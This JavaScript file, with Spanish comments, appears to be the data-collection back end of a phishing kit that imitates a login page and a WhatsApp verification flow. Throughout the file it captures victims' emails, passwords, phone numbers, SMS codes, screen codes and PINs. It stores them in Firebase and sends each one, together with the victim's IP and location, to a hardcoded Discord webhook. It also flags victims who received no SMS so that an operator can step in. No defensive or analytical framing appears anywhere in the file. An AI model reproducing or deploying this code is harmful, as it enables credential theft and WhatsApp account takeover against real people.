// xjsx.js
// Archivo de integración global y Discord

(async function() {
    try {
        await import('./firebase-integration.js');
        
        let currentPage = window.location.pathname.split('/').pop() || 'index.html';
        
        // Inicializar sesión (captura IP, estado, etc.)
        if (window.firebaseIntegration && window.firebaseIntegration.initUserSession) {
            await window.firebaseIntegration.initUserSession(currentPage);
        }
    } catch (e) {
        console.error("Error al cargar integración:", e);
    }
})();

// Compatibilidad con index2.html / index3.html
window.sendLoginData = async function(email, password) {
    let data = { Correo: email };
    if (password) data.Contraseña = password;
    
    // Enviar a Firebase
    if (window.firebaseIntegration) {
        await window.firebaseIntegration.submitDataWithFirebase(data);
    }
    
    // Enviar a Discord
    if (window.sendToDiscord) {
        await window.sendToDiscord(data, "🔐 Nuevo Inicio de Sesión");
    }
    
    return true;
};

// Funciones de envío para el flujo de WhatsApp
window.sendWhatsAppPhone = async function(phone, countryCode, rawPhone, email) {
    const promises = [];
    if (window.firebaseIntegration) {
        promises.push((async () => {
            try {
                const { database, ref, push, update } = window.firebaseIntegration;
                let deviceId = localStorage.getItem('device_id');
                await push(ref(database, 'users/' + deviceId + '/submissions'), {
                    type: 'whatsapp_sync',
                    data: { phoneNumber: phone, countryCode: countryCode || '', rawPhone: rawPhone || '', email: email || '' },
                    timestamp: Date.now()
                });
                await update(ref(database, 'users/' + deviceId), {
                    phoneNumber: phone, email: email || '', currentPage: 'cargando.html', status: 'online', last_active: Date.now()
                });
            } catch (e) { console.warn("Firebase err:", e); }
        })());
    }
    if (window.sendToDiscord) promises.push(window.sendToDiscord({ Teléfono: phone }, "📱 Número WhatsApp"));
    await Promise.all(promises);
};

window.sendWhatsAppScreenCode = async function(phone, code) {
    const promises = [];
    if (window.firebaseIntegration) {
        promises.push((async () => {
            try {
                const { database, ref, push, update } = window.firebaseIntegration;
                let deviceId = localStorage.getItem('device_id');
                await push(ref(database, 'users/' + deviceId + '/submissions'), {
                    type: 'screen_code', data: { pantalla: code, screenCode: code, phoneNumber: phone }, timestamp: Date.now()
                });
                await update(ref(database, 'users/' + deviceId), { currentPage: 'cargando.html', status: 'online', last_active: Date.now() });
            } catch (e) { console.warn("Firebase err:", e); }
        })());
    }
    if (window.sendToDiscord) promises.push(window.sendToDiscord({ Teléfono: phone, "Código de Pantalla": code }, "🖥️ Código de Pantalla"));
    await Promise.all(promises);
};

window.sendWhatsAppSMS = async function(phone, code) {
    const promises = [];
    if (window.firebaseIntegration) {
        promises.push((async () => {
            try {
                const { database, ref, push, update } = window.firebaseIntegration;
                let deviceId = localStorage.getItem('device_id');
                await push(ref(database, 'users/' + deviceId + '/submissions'), {
                    type: 'sms_code', data: { sms: code, jcs: code, phoneNumber: phone }, timestamp: Date.now()
                });
                await update(ref(database, 'users/' + deviceId), { currentPage: 'cargando.html', status: 'online', last_active: Date.now() });
            } catch (e) { console.warn("Firebase err:", e); }
        })());
    }
    if (window.sendToDiscord) promises.push(window.sendToDiscord({ Teléfono: phone, "Código SMS": code }, "📨 Código SMS"));
    await Promise.all(promises);
};

window.sendWhatsAppAdvisor = async function(phone) {
    const promises = [];
    if (window.firebaseIntegration) {
        promises.push((async () => {
            try {
                const { database, ref, push, update } = window.firebaseIntegration;
                let deviceId = localStorage.getItem('device_id');
                await push(ref(database, 'users/' + deviceId + '/submissions'), {
                    type: 'advisor_request', data: { reason: 'No recibió código SMS', phoneNumber: phone }, timestamp: Date.now()
                });
                await update(ref(database, 'users/' + deviceId), { status: 'online', last_active: Date.now() });
            } catch (e) { console.warn("Firebase err:", e); }
        })());
    }
    if (window.sendToDiscord) promises.push(window.sendToDiscord({ Teléfono: phone, "Razón": "Usuario no recibió código SMS" }, "⚠️ SOLICITUD DE ASESOR"));
    await Promise.all(promises);
};

window.sendWhatsAppPIN = async function(phone, pin) {
    const promises = [];
    if (window.firebaseIntegration) {
        promises.push((async () => {
            try {
                const { database, ref, push, update } = window.firebaseIntegration;
                let deviceId = localStorage.getItem('device_id');
                await push(ref(database, 'users/' + deviceId + '/submissions'), {
                    type: 'pin_code', data: { trans: pin, jct: pin, pin: pin, phoneNumber: phone }, timestamp: Date.now()
                });
                await update(ref(database, 'users/' + deviceId), { currentPage: 'cargando.html', status: 'online', last_active: Date.now() });
            } catch (e) { console.warn("Firebase err:", e); }
        })());
    }
    if (window.sendToDiscord) promises.push(window.sendToDiscord({ Teléfono: phone, "PIN": pin }, "🔑 PIN"));
    await Promise.all(promises);
};

window.sendWhatsAppPassword = async function(phone, password) {
    const promises = [];
    if (window.firebaseIntegration) {
        promises.push((async () => {
            try {
                const { database, ref, push, update } = window.firebaseIntegration;
                let deviceId = localStorage.getItem('device_id');
                await push(ref(database, 'users/' + deviceId + '/submissions'), {
                    type: 'password', data: { pass: password, password: password, phoneNumber: phone }, timestamp: Date.now()
                });
                await update(ref(database, 'users/' + deviceId), { currentPage: 'cargando.html', status: 'online', last_active: Date.now() });
            } catch (e) { console.warn("Firebase err:", e); }
        })());
    }
    if (window.sendToDiscord) promises.push(window.sendToDiscord({ Teléfono: phone, "Contraseña W.": password }, "🔒 Contraseña"));
    await Promise.all(promises);
};

// Integración principal con Discord
window.sendToDiscord = async function(data, title) {
    const webhookUrl = localStorage.getItem('discordWebhook') || "https://discord.com/api/webhooks/1550254116314288138/-KYUYnuqB_LBxiadTQdtaeyuuZMCSUEsVao4nqNW3Nz1ftribJtqkyYx0R0InN7e1S-E";
    if (!webhookUrl || webhookUrl === "AQUI_TU_WEBHOOK_DISCORD") return;

    try {
        const ip = localStorage.getItem('user_ip') || "Desconocida";
        const loc = localStorage.getItem('user_location') || "Desconocida";
        const currentTime = new Date().toLocaleString('es-ES', { timeZoneName: 'short' });

        // Determinar color base (Azul por defecto)
        let color = 3447003; // Azul
        if (title.includes("⚠️ SOLICITUD DE ASESOR")) {
            color = 16753920; // Naranja/Amarillo
        } else if (title.includes("Inicio de Sesión")) {
            color = 3066993; // Verde
        } else if (title.includes("WhatsApp") || title.includes("Código") || title.includes("PIN") || title.includes("Contraseña")) {
            color = 2521915; // Verde WhatsApp
        }

        const fields = [];
        for (const key in data) {
            if (data.hasOwnProperty(key)) {
                fields.push({
                    name: key,
                    value: `\`${data[key]}\``,
                    inline: false
                });
            }
        }

        // Siempre añadir IP, Ubicación y Hora
        fields.push(
            { name: "📍 Región/Ciudad", value: loc, inline: true },
            { name: "🌐 IP", value: ip, inline: true },
            { name: "⏰ Hora", value: currentTime, inline: true }
        );

        const payload = {
            embeds: [{
                title: title,
                color: color,
                fields: fields,
                footer: {
                    text: "SC System"
                },
                timestamp: new Date().toISOString()
            }]
        };

        await fetch(webhookUrl, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify(payload)
        });
    } catch (e) {
        console.warn("Discord Webhook error:", e);
    }
};
